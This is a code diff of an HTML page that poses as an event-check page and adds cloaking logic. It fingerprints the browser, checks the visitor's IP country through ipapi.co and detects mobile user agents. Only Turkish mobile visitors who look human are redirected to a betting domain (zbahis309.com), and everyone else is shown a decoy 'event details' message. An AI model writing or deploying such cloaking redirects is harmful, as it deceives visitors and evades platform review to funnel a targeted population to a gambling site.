@@ -5,10 +5,23 @@
   <title>Yönlendirme Kontrol</title>
 </head>
 <body>
-  <h3 style="text-align:center;">Etkinlik kontrolü yapılıyor...</h3>
+  <h3 style="text-align:center;">Kontrol yapılıyor...</h3>
 
   <script>
-    function getFingerprint() {
+    async function getIPCountry() {
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+        return data.country_code === "TR";
+      } catch (e) {
+        return false;
+      }
+    }
+
+    async function checkAndRedirect() {
+      const isMobile = /iPhone|Android|Mobile/i.test(navigator.userAgent);
+      const isTR = await getIPCountry();
+
       const result = {
         canvas: false,
         audio: false,
@@ -40,22 +53,16 @@
       result.fonts = document.fonts ? document.fonts.size || 100 : 100;
       result.plugins = navigator.plugins.length;
 
-      console.log("Fingerprint Result:", result);
+      const isHuman = result.canvas && result.audio && result.webgl && result.fonts > 50 && result.plugins > 2;
 
-      if (
-        result.canvas &&
-        result.audio &&
-        result.webgl &&
-        result.fonts > 50 &&
-        result.plugins > 2
-      ) {
-        window.location.href = "https://bayi.info/";
+      if (isMobile && isTR && isHuman) {
+        window.location.href = "https://zbahis309.com/TheBabayeff";
       } else {
-        document.body.innerHTML = "<h3>Etkinlik Bilgileri burada yer alacak.</h3>";
+        document.body.innerHTML = "<h3>Etkinlik Detayları burada yer alacaktır.</h3>";
       }
     }
 
-    setTimeout(getFingerprint, 2500);
+    setTimeout(checkAndRedirect, 2000);
   </script>
 </body>
 </html>
